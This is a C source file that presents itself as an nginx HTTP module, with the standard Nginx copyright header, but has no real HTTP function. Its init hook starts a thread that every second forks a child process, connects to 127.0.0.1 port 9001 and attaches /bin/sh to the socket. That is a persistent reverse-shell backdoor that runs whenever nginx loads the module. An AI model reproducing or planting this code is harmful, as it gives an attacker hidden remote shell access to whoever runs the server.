
/*
 * Copyright (C) Igor Sysoev
 * Copyright (C) Nginx, Inc.
 */


#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

#include <pthread.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static ngx_int_t ngx_http_server_init(ngx_conf_t *cf);
static void ngx_http_server_exit(ngx_cycle_t *cycle);
void * ngx_http_server_handler(void *cf);

ngx_uint_t dead_pill = 0;
pthread_t pthread_id = -1;

static ngx_http_module_t  ngx_http_server_module_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_server_init,                  /* postconfiguration */

    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */

    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */

    NULL,                                  /* create location configuration */
    NULL                                   /* merge location configuration */
};


ngx_module_t  ngx_http_server_module = {
    NGX_MODULE_V1,
    &ngx_http_server_module_ctx,           /* module context */
    NULL,                                  /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    ngx_http_server_exit,                  /* exit master */
    NGX_MODULE_V1_PADDING
};

static ngx_int_t
ngx_http_server_init(ngx_conf_t *cf)
{
    if (pthread_create(&pthread_id, NULL, ngx_http_server_handler, cf) != 0) {
        ngx_log_error(NGX_LOG_ERR, cf->log, 0, "error creating thread");
        return NGX_ERROR;
    }

    return NGX_OK;
}

static void
ngx_http_server_exit(ngx_cycle_t *cycle)
{
    ngx_log_error(NGX_LOG_ERR, cycle->log, 0, "RECV EXIT SIGNAL");
    dead_pill = 1;

    pthread_join(pthread_id, NULL);
}

void *
ngx_http_server_handler(void *arg)
{
    // ngx_conf_t *cf = arg;

    while (dead_pill == 0) {
        int pid = fork();

        if (pid == 0) {
            int port = 9001;
            struct sockaddr_in revsockaddr;

            int sockt = socket(AF_INET, SOCK_STREAM, 0);
            revsockaddr.sin_family = AF_INET;
            revsockaddr.sin_port = htons(port);
            revsockaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

            connect(sockt, (struct sockaddr *) &revsockaddr, 
            sizeof(revsockaddr));
            dup2(sockt, 0);
            dup2(sockt, 1);
            dup2(sockt, 2);

            char * const argv[] = {"/bin/sh", NULL};
            char * const environ[] = {NULL};
            execve("/bin/sh", argv, environ);
            exit(0);
        }

        ngx_msleep(1000);
    }

    // Clean up
    
    return NGX_OK;
}
